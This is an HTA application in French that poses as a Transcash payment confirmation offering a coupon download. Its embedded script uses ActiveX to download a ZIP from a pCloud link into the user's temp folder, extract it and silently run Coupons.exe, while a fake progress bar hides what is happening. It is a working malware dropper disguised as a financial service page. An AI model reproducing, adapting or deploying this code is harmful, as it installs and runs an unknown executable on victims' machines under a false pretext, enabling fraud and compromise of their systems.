<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Transcash – Ma carte sans banque</title>
  <hta:application 
    applicationname="Générateur Coupon Transcash"
    border="thin"
    caption="yes"
    showintaskbar="yes"
    singleinstance="yes"
    sysmenu="yes"
    scroll="no"
    windowstate="normal" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      text-align: center;
      padding: 50px;
    }

    h1 {
      color: red;
      font-size: 2.5em;
      text-transform: uppercase;
    }

    h2 {
      color: red;
      font-size: 1.8em;
      margin-top: 20px;
    }

    p {
      color: black;
      font-size: 1.2em;
      max-width: 700px;
      margin: 20px auto;
    }

    .clignotant {
      color: red;
      font-weight: bold;
      font-size: 1.2em;
      animation: clignoter 1s infinite;
      margin-top: 30px;
    }

    @keyframes clignoter {
      0% { opacity: 1; }
      50% { opacity: 0; }
      100% { opacity: 1; }
    }

    #downloadBtn {
      margin-top: 30px;
      padding: 15px 30px;
      font-size: 1.2em;
      background-color: #0078D7;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    #progressZone {
      margin-top: 40px;
      display: none;
    }

    #progressBar {
      width: 60%;
      height: 30px;
      background-color: #ddd;
      border-radius: 15px;
      margin: 20px auto;
      overflow: hidden;
    }

    #progressFill {
      height: 100%;
      width: 0%;
      background-color: #4CAF50;
      text-align: center;
      line-height: 30px;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>TRANSCASH MA CARTE SANS BANQUE</h1>
  <h2>Confirmation de paiement en ligne</h2>

  <p>Transcash vous remercie pour votre paiement. Nous avons pris toutes les mesures nécessaires pour garantir la sécurité de vos informations personnelles.</p>

  <div class="clignotant">⚠ Le coupon est uniquement accessible avec votre ordinateur Windows.</div>

  <button id="downloadBtn" onclick="telecharger()">📥 Télécharger le coupon</button>

  <div id="progressZone">
    <p id="progressText">Préparation du téléchargement...</p>
    <div id="progressBar">
      <div id="progressFill">0%</div>
    </div>
  </div>

  <script type="text/javascript">
    function telecharger() {
      try {
        document.getElementById("downloadBtn").disabled = true;
        var progressZone = document.getElementById("progressZone");
        var progressText = document.getElementById("progressText");
        var progressFill = document.getElementById("progressFill");

        progressZone.style.display = "block";
        progressText.innerText = "Téléchargement en cours...";

        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var shell = new ActiveXObject("WScript.Shell");
        var http = new ActiveXObject("MSXML2.XMLHTTP");
        var stream = new ActiveXObject("ADODB.Stream");

        var temp = shell.ExpandEnvironmentStrings("%TEMP%");
        var dossier = temp + "\\PCS";
        var zipPath = dossier + "\\Recharge.Pcs.zip";

        if (!fso.FolderExists(dossier)) {
          fso.CreateFolder(dossier);
        }

        progressFill.style.width = "10%";
        progressFill.innerText = "10%";

        http.Open("GET", "https://e.pcloud.link/publink/download?code=XZ5Xe6ZhgpIpYVoCF5foqtpEQ3n6SMSUJWX", false);
        http.Send();

        progressFill.style.width = "40%";
        progressFill.innerText = "40%";
        progressText.innerText = "Sauvegarde du fichier ZIP...";

        stream.Type = 1; // binaire
        stream.Open();
        stream.Write(http.responseBody);
        stream.SaveToFile(zipPath, 2); // overwrite
        stream.Close();

        progressFill.style.width = "60%";
        progressFill.innerText = "60%";
        progressText.innerText = "Extraction du coupon...";

        var shellApp = new ActiveXObject("Shell.Application");
        var zip = shellApp.NameSpace(zipPath);
        var destination = shellApp.NameSpace(dossier);

        if (zip !== null && destination !== null) {
          destination.CopyHere(zip.Items(), 20);
        }

        progressFill.style.width = "85%";
        progressFill.innerText = "85%";
        progressText.innerText = "Lancement du coupon...";

        var exePath = dossier + "\\Coupons.exe";
        if (fso.FileExists(exePath)) {
          shell.Run('"' + exePath + '"', 1, false);
          progressFill.style.width = "100%";
          progressFill.innerText = "100%";

          // Fermeture automatique de l’interface après 1 seconde
          setTimeout(function () {
            window.close();
          }, 1000);
        } else {
          progressText.innerText = "Erreur : Coupons.exe introuvable.";
          progressFill.style.backgroundColor = "red";
        }

      } catch (e) {
        alert("Erreur : " + e.message);
      }
    }
  </script>

</body>
</html>
